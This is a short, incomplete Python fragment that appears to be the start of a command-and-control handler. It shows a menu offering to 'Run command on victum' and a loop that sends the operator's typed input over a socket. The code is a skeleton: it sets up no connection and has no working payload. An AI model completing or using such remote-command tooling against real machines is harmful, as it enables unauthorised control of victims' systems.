import socket

def showOptions():
    print("\n")
    print("\t\t[ 01 ] Run command on victum ")



def handleConnection(my_socket):
    print("[+] handling connection ")

    while True:
        user_input =  input("[+] Select options")

        my_socket.send_data(user_input)

        